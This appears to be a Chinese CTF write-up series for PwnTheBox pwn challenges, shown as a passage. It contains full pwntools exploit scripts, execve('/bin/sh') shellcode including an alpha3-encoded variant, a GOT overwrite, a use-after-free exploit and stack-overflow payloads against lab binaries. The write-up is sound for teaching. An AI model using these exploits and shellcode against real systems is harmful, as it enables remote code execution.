# 先创建3个chunk
create(0x90,b'aaaa') #chunk0
create(0x90,b'bbbb') #chunk1
create(0x20,b'/bin/sh\x00') #chunk2

# 编辑chunk0 构造出一个fake_chunk, 用于在释放chunk1时方便chunk1和fake_chunk进行合并
fake_chunk = p64(0) + p64(0x91) + p64(heaparray_creater-0x18) + p64(heaparray_creater-0x10)
fake_chunk = fake_chunk.ljust(0x90, b'a')
fake_chunk += p64(0x90) + p64(0xa0)
edit(0,0x100,fake_chunk)
delete(1)
payload = p64(0)*3 +p64(free_got)
edit(0,0x20 ,payload)
# 将free_got修改成system_plt, 这样在执行delete()时真正执行的就是system
edit(0,8,p64(system_plt))
delete(2)

io.interactive()
```

------

### ♥ [b0verfl0w](https://ce.pwnthebox.com/challenges?type=4&id=1642)

先`file ./b0verfl0w `查看文件类型，再`checksec --file=./b0verfl0w `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./b0verfl0w          
./b0verfl0w: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./easyheap 
[*] '/home/tyd/ctf/pwn/pwnthebox/easyheap'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  return vul();
}
```

双击`vul()`函数继续审计源码，该函数中有个局部变量`s`是`char`型数组，`s`的长度是`32`字节，可用栈大小为`0x38`字节。`fgets()`函数读取输入到变量`s`时限制输入的大小为`50`字节，显然存在栈溢出漏洞。

```c
int vul()
{
  char s[32]; // [esp+18h] [ebp-20h] BYREF

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(s, 50, stdin);
  printf("Hello %s.", s);
  fflush(stdout);
  return 1;
}
```

`fgets()`只能输入`50`个字节，其中`padding`占了`0x20`个字节，`fake ebp`还需要`0x4`个字节覆盖到栈帧底部，`ret`还需要`0x4`个字节，实际剩下的就只有`0xa`个字节。我们可以这样来构造栈，在栈的初始位置写入一段`shellcode`，然后最后`0xa`个字节让程序跳转到栈的起始处执行`shellcode`。

![](https://paper.tanyaodan.com/PwnTheBox/1642/1.jpg)

注意到`Functions window`中有个`hint`函数，其汇编代码如下，可以看到`jmp esp`的地址是`0x8048504`，这就不需要用`ROPgadget`来获取`jmp esp`的地址啦。当`ret`指令是从段间转移的`call`指令进入的子程序中返回时，会修改`eip`和`esp`寄存器。所以当`ret`的地址被赋值为`0x8048504`时就会执行`jmp esp`，此时`esp = esp + 4`，`esp`寄存器指向`sub esp, 0x28; jmp esp`，同时`esp`寄存器中的数据出栈赋值给`eip`寄存器，`eip`寄存器也指向`sub esp, 0x28; jmp esp`，这样就可以劫持`esp`寄存器指向`shellcode`处，程序继续执行`jmp esp`，就会跳转到栈的起始处执行`shellcode`。

```assembly
.text:080484FD                 public hint
.text:080484FD hint            proc near
.text:080484FD ; __unwind {
.text:080484FD                 push    ebp
.text:080484FE                 mov     ebp, esp
.text:08048500                 sub     esp, 24h
.text:08048503                 retn
.text:08048503 hint            endp ; sp-analysis failed
.text:08048503
.text:08048504 ; ---------------------------------------------------------------------------
.text:08048504                 jmp     esp
.text:08048506 ; ---------------------------------------------------------------------------
.text:08048506                 retn
.text:08048507 ; ---------------------------------------------------------------------------
.text:08048507                 mov     eax, 1
.text:0804850C                 pop     ebp
.text:0804850D                 retn
.text:0804850D ; } // starts at 80484FD
```

编写`shellcode`来获取`system("/bin/sh")`以操控靶机。

```assembly
xor eax, eax    ; clear eax
xor edx, edx    ; clear edx
push edx        ; 将0入栈 标记了'/bin/sh'的结尾
push 0x68732f2f ; 将'/sh'的地址入栈 为了4字节对齐 传递的是'//sh', 这在execve()中等同于'/sh'
push 0x6e69622f ; 将'/bin'的地址入栈
mov ebx, esp    ; 此时esp指向'/bin/sh' 通过esp将字符串赋值给ebx
xor ecx, ecx    ; clear ecx
mov al, 0xb     ; eax置为execve()函数的中断号
int 0x80        ; 调用syscall()函数软中断
```

编写`shellcode`来获取`system("/bin/sh")`汇编代码所对应的机器码，`i386`架构下的`shellcode`一共有三种写法。

```python
shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode) # len(shellcode) = 23
# 以上代码等价于下面这行 不过下面这行更简洁 len(shellcode) = 21
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

shellcode = asm(shellcraft.sh()) # 一般情况下不用 太长啦 len(shellcode) = 44
```

编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10461`，发送`payload`即可得到`PTB{986eef70-9609-4709-b34a-e07257c82b53}`，提交即可。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10461)

shellcode = '''
xor eax, eax
xor edx, edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov al, 0xb
int 0x80
'''
shellcode = asm(shellcode)
# shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

jmp_esp = 0x8048504
sub_esp_jmp = asm('sub esp, 0x28; jmp esp')
payload = shellcode + (0x20-len(shellcode)+4)*b'a' + p32(jmp_esp) + sub_esp_jmp

io.sendlineafter("What's your name?", payload)
io.interactive()
```

------

### [baby rop 2](https://ce.pwnthebox.com/challenges?type=4&page=1&id=558)



### [uaf](https://ce.pwnthebox.com/challenges?id=559)

先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./hacknote            
./hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=44ee75c492628b3691cdcdb07759e9bbe551644a, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./hacknote            
[*] '/home/tyd/ctf/pwn/pwnthebox/hacknote'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`hacknote`，按`F5`反汇编源码并查看主函数。输入`1`增加节点，输入`2`删除节点，输入`3`打印节点。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[4]; // [esp+0h] [ebp-Ch] BYREF
  int *v5; // [esp+4h] [ebp-8h]

  v5 = &argc;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v3 = atoi(buf);
      if ( v3 != 2 )
        break;
      del_note();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        print_note();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}
```

查看增加节点的函数`add_note()`，发现最多创建`5`个`chunk`，`notelist[i]`用来存放`chunk`的地址，`notelist`是存放在`.bss`段上的，申请了一个大小为`8`字节的`chunk`保存当前`chunk`的指针，然后再`malloc`用户申请的`chunk`。

`read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size)`用来向`chunk`中写入`size`大小的内容。

```c
int add_note()
{
  int result; // eax
  int v1; // esi
  char buf[8]; // [esp+0h] [ebp-18h] BYREF
  size_t size; // [esp+8h] [ebp-10h]
  int i; // [esp+Ch] [ebp-Ch]

  result = count;
  if ( count > 5 )
    return puts("Full");
  for ( i = 0; i <= 4; ++i )
  {
    result = *((_DWORD *)&notelist + i);
    if ( !result )
    {
      *((_DWORD *)&notelist + i) = malloc(8u);
      if ( !*((_DWORD *)&notelist + i) )
      {
        puts("Alloca Error");
        exit(-1);
      }
      **((_DWORD **)&notelist + i) = print_note_content;
      printf("Note size :");
      read(0, buf, 8u);
      size = atoi(buf);
      v1 = *((_DWORD *)&notelist + i);
      *(_DWORD *)(v1 + 4) = malloc(size);
      if ( !*(_DWORD *)(*((_DWORD *)&notelist + i) + 4) )
      {
        puts("Alloca Error");
        exit(-1);
      }
      printf("Content :");
      read(0, *(void **)(*((_DWORD *)&notelist + i) + 4), size);
      puts("Success !");
      return ++count;
    }
  }
  return result;
}
```

`del_note()`函数中，`free`释放掉相应的`chunk`后并没有将`chunk`的指针置为`0`，所以存在`uaf`漏洞。

```c
int del_note()
{
  int result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = *((_DWORD *)&notelist + v2);
  if ( result )
  {
    free(*(void **)(*((_DWORD *)&notelist + v2) + 4));
    free(*((void **)&notelist + v2));
    result = puts("Success");
  }
  return result;
}
```

`print_note()`函数可以用来输出`chunk`中的内容。

```c
int print_note()
{
  int result; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  int v2; // [esp+Ch] [ebp-Ch]

  printf("Index :");
  read(0, buf, 4u);
  v2 = atoi(buf);
  if ( v2 < 0 || v2 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  result = *((_DWORD *)&notelist + v2);
  if ( result )
    result = (**((int (__cdecl ***)(_DWORD))&notelist + v2))(*((_DWORD *)&notelist + v2));
  return result;
}
```

注意到程序中有个`magic()`函数地址为`0x8048945`。

```c
int magic()
{
  return system("/bin/sh");
}
```

我们可以利用`uaf`漏洞来修改`chunk`指针的内容从而调用`/bin/sh`，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10020`，发送`payload`即可得到`PTB{cb3bb65d-204d-45b7-a565-6553d0de729c}`。

```python
from pwn import *

def add(size, content):
    io.sendlineafter('Your choice :', '1')
    io.sendlineafter('Note size :', str(size))
    io.sendlineafter('Content :', content)

def free(index):
    io.sendlineafter('choice :', '2')
    io.sendlineafter('Index :', str(index))

def show(index):
    io.sendlineafter('choice :', '3')
    io.sendlineafter('Index :', str(index))

io = remote('redirect.do-not-trust.hacking.run', 10020)
magic_address = 0x8048945
add(0x20, b'fuck')
add(0x20, b'fuck')
free(0)
free(1)
add(0x8, p64(magic_address))
show(0)
io.interactive()
```

------

### [Shell 黑客 1](https://ce.pwnthebox.com/challenges?id=1007)

题目没有附件，`nc redirect.do-not-trust.hacking.run 10021`可以输入但是没有回显。结合题目描述：

> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！

直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。

```python
from pwn import *

context(arch = 'amd64', os = 'linux',log_level = 'debug')
io = remote('redirect.do-not-trust.hacking.run', 10021)
io.sendline(asm(shellcraft.sh()))
io.interactive()
```

------

### [bof](https://ce.pwnthebox.com/challenges?id=945)

先`file ./hacknote `查看文件类型，再`checksec --file=./hacknote `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./bof                 
./bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d52165d6e0b268def0e0344ffa9e9e5247f1a9e2, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./bof                 
[*] '/home/tyd/ctf/pwn/pwnthebox/bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

用`IDA Pro 64bit`打开`bof`后按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  puts("Greetings! Have fun with Xp0int!");
  puts("Your name: ");
  read(0, &NAME, 0x18uLL);
  fun1();
  return 0;
}
```

`NAME`变量存放在`.bss`段上，程序存在栈溢出漏洞且未开启`NX`防护，可以通过`read()`函数向`.bss`段写入`0x18`字节的`shellcode`。

双击`NAME`变量可以看到其起始地址为`0x404070`。

```assembly
.bss:0000000000404070                 public NAME
.bss:0000000000404070 NAME            db    ? ;               ; DATA XREF: main+50↑o
.........
.bss:0000000000404087 _bss            ends
```

`fun1()`函数详情如下：

```c
ssize_t __fastcall fun1(__int64 a1, const char *a2)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("Well, %s this is a simple one.(*_*)\n", a2);
  return read(0, buf, 0x30uLL);
}
```

双击`buf`变量可以查看大致栈结构，我们需要`0x20`个字节来覆盖`padding`，`fake rbp`还需要`0x8`个字节覆盖到栈帧底部。

```assembly
-0000000000000020 ; D/A/*   : change type (data/ascii/array)
-0000000000000020 ; N       : rename
-0000000000000020 ; U       : undefine
-0000000000000020 ; Use data definition commands to create local variables and function arguments.
-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020 ;
-0000000000000020
-0000000000000020 buf             db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`amd64`架构的`shellcode`汇编代码如下：

```assembly
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f ; 将'/bin/sh'传递给rdi
push rdi                  ; 将'/bin/sh'压入栈
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b                 ; 系统调用号
pop rax
syscall
```

然而它超过了`0x18`字节，科学上网找了个简短的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10025`，发送`payload`即可得到`PTB{ecfca74a-376c-4e71-8e09-da5cf5c3f024}`，提交即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10025)
address = 0x404070
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
print(len(asm(shellcode))) # 30 超过了0x18 重新写
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendline(shellcode)
payload = b'a'*(0x20+0x8)+p64(address)
io.sendline(payload)
io.interactive()
```

------

### [Getting Start](https://ce.pwnthebox.com/challenges?id=1697)

先`file ./task_gettingStart_ktQeERc  `查看文件类型，再`checksec --file=./task_gettingStart_ktQeERc  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./task_gettingStart_ktQeERc
./task_gettingStart_ktQeERc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./task_gettingStart_ktQeERc
[*] '/home/tyd/ctf/pwn/pwnthebox/task_gettingStart_ktQeERc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，双击`buf`变量可以查看栈结构。

注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 buf[3]; // [rsp+10h] [rbp-30h] BYREF
  __int64 v5; // [rsp+28h] [rbp-18h]
  double v6; // [rsp+30h] [rbp-10h]
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  buf[2] = 0LL;
  v5 = 0x7FFFFFFFFFFFFFFFLL;
  v6 = 1.797693134862316e308;
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("HuWangBei CTF 2018 will be getting start after %lu seconds...\n", 0LL);
  puts("But Whether it starts depends on you.");
  read(0, buf, 0x28uLL);
  if ( v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1 )
  {
    printf("HuWangBei CTF 2018 will be getting start after %g seconds...\n", v6);
    system("/bin/sh");
  }
  else
  {
    puts("Try again!");
  }
  return 0LL;
}
```

分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。

```assembly
-0000000000000040 ; D/A/*   : change type (data/ascii/array)
-0000000000000040 ; N       : rename
-0000000000000040 ; U       : undefine
-0000000000000040 ; Use data definition commands to create local variables and function arguments.
-0000000000000040 ; Two special fields " r" and " s" represent return address and saved registers.
-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0
-0000000000000040 ;
-0000000000000040
-0000000000000040                 db ? ; undefined
-000000000000003F                 db ? ; undefined
-000000000000003E                 db ? ; undefined
-000000000000003D                 db ? ; undefined
-000000000000003C                 db ? ; undefined
-000000000000003B                 db ? ; undefined
-000000000000003A                 db ? ; undefined
-0000000000000039                 db ? ; undefined
-0000000000000038 var_38          dq ?
-0000000000000030 buf             dq ?
-0000000000000028 var_28          dq ?
-0000000000000020 var_20          dq ?
-0000000000000018 v5              dq ?
-0000000000000010 v6              dq ?
-0000000000000008 var_8           dq ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)

当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)

编写`Python`代码即可得到`PTB{4c092b9f-0176-442b-8afc-fd587f7c4a91}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10070)
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendline(payload)
io.interactive()
```

------

### [shellcode](https://ce.pwnthebox.com/challenges?id=1765)

先`file ./mrctf2020_shellcode `查看文件类型，再`checksec --file=./mrctf2020_shellcode `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./mrctf2020_shellcode
./mrctf2020_shellcode: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5024a9527dd620c442aaba45f15a2e9342d58ff, for GNU/Linux 3.2.0, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./mrctf2020_shellcode
[*] '/home/tyd/ctf/pwn/pwnthebox/mrctf2020_shellcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

使用`IDA pro 64bit`打开附件`mrctf2020_shellcode`，按`F5`反汇编源码失败，直接查看汇编代码。`buf`大小为`0x410`字节，而`read`函数读入到`buf`的限制大小为`0x400`字节，不存在栈溢出漏洞，但是足以系统调用`shell`啦。`jg`是如果`cmp`大于则跳转，`jl`是如果`cmp`小于则跳转，`jmp`是无条件跳转指令。

```assembly
.text:0000000000001155 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000001155                 public main
.text:0000000000001155 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000001155
.text:0000000000001155 buf             = byte ptr -410h
.text:0000000000001155 var_4           = dword ptr -4
.text:0000000000001155
.text:0000000000001155 ; __unwind {
.text:0000000000001155                 push    rbp
.text:0000000000001156                 mov     rbp, rsp
.text:0000000000001159                 sub     rsp, 410h
.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5
.text:0000000000001167                 mov     esi, 0          ; buf
.text:000000000000116C                 mov     rdi, rax        ; stream
.text:000000000000116F                 call    _setbuf
.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5
.text:000000000000117B                 mov     esi, 0          ; buf
.text:0000000000001180                 mov     rdi, rax        ; stream
.text:0000000000001183                 call    _setbuf
.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5
.text:000000000000118F                 mov     esi, 0          ; buf
.text:0000000000001194                 mov     rdi, rax        ; stream
.text:0000000000001197                 call    _setbuf
.text:000000000000119C                 lea     rdi, s          ; "Show me your magic!"
.text:00000000000011A3                 call    _puts
.text:00000000000011A8                 lea     rax, [rbp+buf]
.text:00000000000011AF                 mov     edx, 400h       ; nbytes
.text:00000000000011B4                 mov     rsi, rax        ; buf
.text:00000000000011B7                 mov     edi, 0          ; fd
.text:00000000000011BC                 mov     eax, 0
.text:00000000000011C1                 call    _read
.text:00000000000011C6                 mov     [rbp+var_4], eax
.text:00000000000011C9                 cmp     [rbp+var_4], 0
.text:00000000000011CD                 jg      short loc_11D6
.text:00000000000011CF                 mov     eax, 0
.text:00000000000011D4                 jmp     short locret_11E4
.text:00000000000011D6 ; ---------------------------------------------------------------------------
.text:00000000000011D6
.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j
.text:00000000000011D6                 lea     rax, [rbp+buf]
.text:00000000000011DD                 call    rax
.text:00000000000011DF                 mov     eax, 0
.text:00000000000011E4
.text:00000000000011E4 locret_11E4:                            ; CODE XREF: main+7F↑j
.text:00000000000011E4                 leave
.text:00000000000011E5                 retn
.text:00000000000011E5 ; } // starts at 1155
.text:00000000000011E5 main            endp
```

编写`Python`代码即可得到`PTB{983cfea6-e827-4ce1-8ae1-bd487168f519}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10116)
shellcode = asm('''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
''')
# shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()
```

------

### [number game](https://ce.pwnthebox.com/challenges?id=1774)

先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./wustctf2020_number_game                                                              
./wustctf2020_number_game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ad95bd0bc056d1f68fc74a2a3f2cd7ce63ada796, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./wustctf2020_number_game                                                 
[*] '/home/tyd/ctf/pwn/pwnthebox/wustctf2020_number_game'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vulnerable();
  return 0;
}
```

双击`vulnerable()`查看函数详情：

```c
unsigned int vulnerable()
{
  int v1; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  v1 = 0;
  __isoc99_scanf("%d", &v1);
  if ( v1 >= 0 || (v1 = -v1, v1 >= 0) )
    printf("You lose");
  else
    shell();
  return __readgsdword(0x14u) ^ v2;
}
```

当输入的数字`v1`是负数，且`v1`的相反数也是负数，才可以执行`shell`。`32`位系统`int`型取值范围是`[-2147483648, 2147483647]`。那这不是显然了吗？直接`nc`进去输入`-2147483647`就行啦。当然也可以编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10124`，发送`payload`即可得到`PTB{2cdb6e65-3494-4643-9d4a-3f08e76c1361}`，提交即可。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10124)
io.sendline(b'-2147483648')
io.interactive()
```

------

### [Shell 黑客 2](https://ce.pwnthebox.com/challenges?id=1008)

题目没有附件，`nc redirect.do-not-trust.hacking.run 10168`可以输入但是没有回显。结合题目描述：

> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！

直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限失败。利用`alpha3`进行编码生成一段没有坏字符的`shellcode`。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10168)
shellcode = b'PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5F06'
io.send(shellcode)
io.interactive()
```

------

### [orw](https://ce.pwnthebox.com/challenges?id=1688)

先`file ./orw `查看文件类型，再`checksec --file=./orw `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./orw
./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
                                                                                                                          
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./orw
[*] '/home/tyd/ctf/pwn/pwnthebox/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

使用`IDA pro 32bit`打开附件`orw`，按`F5`反汇编源码并查看主函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

双击`orw_seccomp()`函数，详情如下：

```c
unsigned int orw_seccomp()
{
  __int16 v1; // [esp+4h] [ebp-84h] BYREF
  char *v2; // [esp+8h] [ebp-80h]
  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v4; // [esp+6Ch] [ebp-1Ch]

  v4 = __readgsdword(0x14u);
  qmemcpy(v3, &unk_8048640, sizeof(v3));
  v1 = 12;
  v2 = v3;
  prctl(38, 1, 0, 0, 0);
  prctl(22, 2, &v1);
  return __readgsdword(0x14u) ^ v4;
}
```

`prctl(38, 1, 0, 0, 0);`表示禁止提权，比如`system`和`onegadget`都不能用了。`prctl(22, 2, &v1);`限制了能执行系统调用的函数。`seccomp`是`Linux`系统的一种安全机制，主要功能是限制直接通过`syscall`去调用某些系统函数。我们可以用`seccomp-tools`去分析程序的`seccomp`状态。

```bash
sudo gem install seccomp-tools
```

通过`seccomp-tools`发现可以使用`open`，`read`，`write`这三个函数。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
